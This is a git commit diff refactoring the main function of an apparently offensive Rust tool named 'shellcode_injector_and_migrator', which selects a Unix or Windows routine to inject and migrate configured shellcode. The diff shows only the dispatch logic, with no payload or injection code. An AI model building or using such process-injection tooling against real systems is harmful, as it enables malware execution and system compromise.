d4a3ea0f1ae3031b25707ef53eb2f257d571ac03
kmanc <kmancxc@gmail.com>
2021-12-20 05:30:45 -0800

    Small refactor (#3)
    * move target checks out of main
    
    * Cargo update

--- src/shellcode_injector_and_migrator/inj_and_mig.rs
+++ src/shellcode_injector_and_migrator/inj_and_mig.rs
@@ -4,19 +4,16 @@ mod config;
 // Load the appropriate operating system's implementation
 #[cfg(unix)]
 mod unix_im;
+#[cfg(unix)]
+use unix_im::inject_and_migrate;
 
 #[cfg(windows)]
 extern crate windows;
 #[cfg(windows)]
 mod windows_im;
+#[cfg(windows)]
+use windows_im::inject_and_migrate;
 
 fn main() {
-    if cfg!(target_os = "windows"){
-        #[cfg(windows)]
-        windows_im::inject_and_migrate(config::SHELLCODE);
-    }
-    else {
-        #[cfg(unix)]
-        unix_im::inject_and_migrate(config::SHELLCODE);
-    };
+    inject_and_migrate(config::SHELLCODE);
 }
